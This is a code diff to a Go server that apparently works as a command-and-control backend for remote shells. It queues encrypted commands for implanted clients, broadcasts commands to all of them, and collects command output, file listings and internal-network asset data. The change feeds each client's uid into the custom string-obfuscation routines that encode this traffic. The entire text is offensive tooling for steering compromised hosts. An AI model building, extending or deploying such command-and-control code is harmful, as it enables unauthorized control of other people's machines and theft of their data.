@@ -262,7 +262,7 @@ func Shells(w http.ResponseWriter, r *http.Request){
         http.Error(w, "Missing data", http.StatusInternalServerError)
         return
     }
-    data := get_decry_s(&encry_str, &key)
+    data := get_decry_s(&encry_str, &key,&uid)
     data_list := strings.Split(data,"^")
     shellname := data_list[0]
     username := data_list[1]
@@ -568,7 +568,7 @@ func getresults(uid string,w http.ResponseWriter) {
 		if exists1 && exists2 {
 			delete(shell_post,uid)
 			mutex.Unlock()
-			decryptedData := get_decry_s(&shell_results, &key)
+			decryptedData := get_decry_s(&shell_results, &key,&uid)
 			fmt.Fprint(w, decryptedData)
 		} else {
 			mutex.Unlock()
@@ -630,7 +630,7 @@ func results(w http.ResponseWriter, r *http.Request) {
 				log_str := fmt.Sprintf("%v Host:%s  [%s]The file already exists in the current directory: [%s]\n", formattedTime,shellname,uid, results)
 				logger.Println(log_str)
 			} else {
-				r_results := get_decry_s(&results, &key)
+				r_results := get_decry_s(&results, &key,&uid)
 				log_str := fmt.Sprintf("%v Host:%s  [%s]The bytes passed in is:[*%d...]\n", formattedTime,shellname,uid, len(r_results))
 				logger.Println(log_str)
 			}
@@ -647,7 +647,7 @@ func net_getresults(uid string,w http.ResponseWriter) {
 		if exists1 && exists2 {
 			delete(shell_net_post, uid)
 			mutex.Unlock()
-			decryptedData := get_decry_s(&shell_results, &key)
+			decryptedData := get_decry_s(&shell_results, &key,&uid)
 			//判断开头字符串
 			if strings.HasPrefix(decryptedData, "innet^") {
 				//存入内网资产结构体...
@@ -701,7 +701,7 @@ func net_results(w http.ResponseWriter, r *http.Request) {
                 }
             }
 			mutex.Unlock()
-            r_results := get_decry_s(&results, &key)
+            r_results := get_decry_s(&results, &key,&uid)
             current := time.Now()
             formattedTime := current.Format("2006.01.02 15:04")
             logStr := fmt.Sprintf("%v Host%s&&%sIncoming internal network assets:[*%d...]\n", formattedTime, shellname, uid, len(r_results))
@@ -760,7 +760,7 @@ func getcmd(uid,cmd string,w http.ResponseWriter) {
 		mutex.Lock()
 		key, exists := key_map[uid]
 		if exists {
-			encryptedCmd := get_encry_s(&cmd, &key)
+			encryptedCmd := get_encry_s(&cmd, &key,&uid)
 			shell_get[uid] = encryptedCmd
 		}
 		mutex.Unlock()
@@ -776,7 +776,7 @@ func getcmd(uid,cmd string,w http.ResponseWriter) {
 				client_data.Clients[i].version = version
 				key, exists := key_map[uid]
 				if exists {
-					encryptedCmd := get_encry_s(&cmd, &key)
+					encryptedCmd := get_encry_s(&cmd, &key,&uid)
 					shell_get[uid] = encryptedCmd
 				}
 			}
@@ -801,7 +801,7 @@ func getcmd(uid,cmd string,w http.ResponseWriter) {
 			newCmd := fmt.Sprintf("%s^%s^%s^%d^%s", parts[0], parts[1], parts[2], sleep_time, part5)
 			key, exists := key_map[uid]
 			if exists {
-				encryptedCmd := get_encry_s(&newCmd, &key)
+				encryptedCmd := get_encry_s(&newCmd, &key,&uid)
 				mutex.Lock()
 				shell_get[uid] = encryptedCmd
 				mutex.Unlock()
@@ -1015,7 +1015,7 @@ func get_file_list(uid string,w http.ResponseWriter) {
 	if exists1 && exists2 {
 		mutex.Unlock()
 		delete(file_list,uid)
-		decryptedData:= get_decry_s(&file, &key)
+		decryptedData:= get_decry_s(&file, &key,&uid)
 		if decryptedData != ""{
 			fmt.Fprint(w, decryptedData)
 		}
@@ -1154,7 +1154,7 @@ func getAll(username,cmd,osType string){
 				mutex.Lock()
 				key, exists := key_map[client.Uid]
 				if exists {
-					encryptedCmd := get_encry_s(&cmd, &key)
+					encryptedCmd := get_encry_s(&cmd, &key,&client_data.Clients[i].Uid)
 					shell_get[client.Uid] = encryptedCmd
 					mutex.Unlock()
 				}
@@ -1254,13 +1254,13 @@ func get_encry_f(inputFile io.Reader, outputFile *os.File, key []byte) error {
 }
 
 // 加密字符串，结果由等量的字符表示
-func get_encry_s(input *string, key *string) string {
+func get_encry_s(input,key,uid *string) string {
     // 获取 key 的后三个字符
-	keyLength := len(*key)
-	splitChar := (*key)[keyLength-4]
-	firstChar := (*key)[keyLength-3] // F
-	secondChar := (*key)[keyLength-2] // a
-	thirdChar := (*key)[keyLength-1] // .
+	Length := len(*uid)
+	splitChar := (*uid)[Length-4]
+	firstChar := (*uid)[Length-3] // F
+	secondChar := (*uid)[Length-2] // a
+	thirdChar := (*uid)[Length-1] // .
 	// 调用加密函数
 	encryptedBytes := encryptDecrypt([]byte(*input), []byte(*key))
 	var segments []string
@@ -1287,13 +1287,13 @@ func get_encry_s(input *string, key *string) string {
 }
 
 // 解密字符串，从字符重复的模式恢复为原始字节
-func get_decry_s(input *string, key *string) string {
+func get_decry_s(input,key,uid *string) string {
     // 获取 key 的后三个字符
-	keyLength := len(*key)
-	splitChar := (*key)[keyLength-4]
-	firstChar := (*key)[keyLength-3] // F
-	secondChar := (*key)[keyLength-2] // a
-	thirdChar := (*key)[keyLength-1] // .
+	Length := len(*uid)
+	splitChar := (*uid)[Length-4]
+	firstChar := (*uid)[Length-3] // F
+	secondChar := (*uid)[Length-2] // a
+	thirdChar := (*uid)[Length-1] // .
 	// 分割加密字符串
 	segments := strings.Split(*input, string(splitChar))
 	var encryptedBytes []byte
